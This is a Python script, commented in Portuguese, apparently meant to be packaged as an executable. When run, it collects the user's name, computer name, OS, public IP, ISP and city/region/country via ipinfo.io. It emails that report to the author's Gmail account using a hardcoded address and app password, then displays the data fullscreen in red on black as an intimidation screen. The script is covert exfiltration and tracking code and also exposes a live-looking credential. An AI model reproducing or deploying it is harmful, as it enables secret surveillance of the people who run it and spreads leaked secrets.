import getpass
import platform
import datetime
import requests
import os
import sys
from PIL import Image, ImageTk
import tkinter as tk
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from dotenv import load_dotenv

load_dotenv()

def resource_path(relative_path):
    """Caminho absoluto (para usar em .exe também)"""
    try:
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

def get_system_info():
    """Coleta dados do sistema e IP"""
    usuario = getpass.getuser()
    computador = platform.node()
    sistema = platform.system()
    arquitetura = platform.machine()
    hora_atual = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    try:
        resposta = requests.get("https://ipinfo.io", timeout=5)
        dados_ip = resposta.json()
        ip = dados_ip.get("ip", "N/A")
        provedor = dados_ip.get("org", "N/A")
        cidade = dados_ip.get("city", "N/A")
        regiao = dados_ip.get("region", "N/A")
        pais = dados_ip.get("country", "N/A")
    except Exception as e:
        print(f"Erro ao obter IP: {e}")
        ip = provedor = cidade = regiao = pais = "Erro"

    return {
        "usuario": usuario,
        "computador": computador,
        "sistema": sistema,
        "arquitetura": arquitetura,
        "hora": hora_atual,
        "ip": ip,
        "provedor": provedor,
        "cidade": cidade,
        "regiao": regiao,
        "pais": pais
    }

def montar_mensagem(info):
    """Cria o texto do relatório"""
    return (
        f"RELATÓRIO DO SISTEMA:\n\n"
        f"Usuário: {info['usuario']}\n"
        f"PC: {info['computador']}\n"
        f"Sistema: {info['sistema']} ({info['arquitetura']})\n"
        f"Data/Hora: {info['hora']}\n"
        f"IP: {info['ip']}\n"
        f"Provedor: {info['provedor']}\n"
        f"Local: {info['cidade']} - {info['regiao']}, {info['pais']}\n"
    )


def enviar_email(mensagem):
    """Envia o relatório por e-mail"""
    remetente = "joaovictorlisboaporcel4@gmail.com"
    senha = "hyab zxns mlij ueuf"
    destinatario = "joaovictorlisboaporcel4@gmail.com"
    
    if not remetente or not senha or not destinatario:
        print("❌ Variáveis de ambiente do e-mail não estão definidas corretamente.")
        return

    msg = MIMEMultipart()
    msg["From"] = remetente
    msg["To"] = destinatario
    msg["Subject"] = f"RELATÓRIO DO SISTEMA"
    msg.attach(MIMEText(mensagem, "plain"))

    try:
        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as servidor:
            servidor.login(remetente, senha)
            servidor.send_message(msg)
            print("✅ E-mail enviado com sucesso!")
    except Exception as e:
        print(f"❌ Erro ao enviar e-mail: {e}")


def exibir_interface(mensagem):
    """Cria a interface gráfica com o relatório"""
    root = tk.Tk()
    root.title("Relatório")
    root.attributes('-fullscreen', True)
    root.configure(bg='black')

    try:
        img = Image.open(resource_path("icone.ico"))
        screen_width = root.winfo_screenwidth()
        screen_height = root.winfo_screenheight()
        img = img.resize((screen_width, screen_height))
        img_tk = ImageTk.PhotoImage(img)
        label_img = tk.Label(root, image=img_tk)
        label_img.place(x=0, y=0, relwidth=1, relheight=1)
    except:
        pass

    frame_texto = tk.Frame(root, bg='#000000', bd=10)
    frame_texto.place(relx=0.5, rely=0.5, anchor='center')

    label_texto = tk.Label(
        frame_texto,
        text=mensagem,
        font=("Courier New", 18),
        fg="red",
        bg="#000000",
        justify="left",
        anchor='center'
    )
    label_texto.pack(padx=20, pady=20)

    root.bind("<Escape>", lambda e: root.destroy())
    root.mainloop()

# 🚀 Execução principal
if __name__ == "__main__":
    info = get_system_info()
    mensagem = montar_mensagem(info)
    enviar_email(mensagem)
    exibir_interface(mensagem)
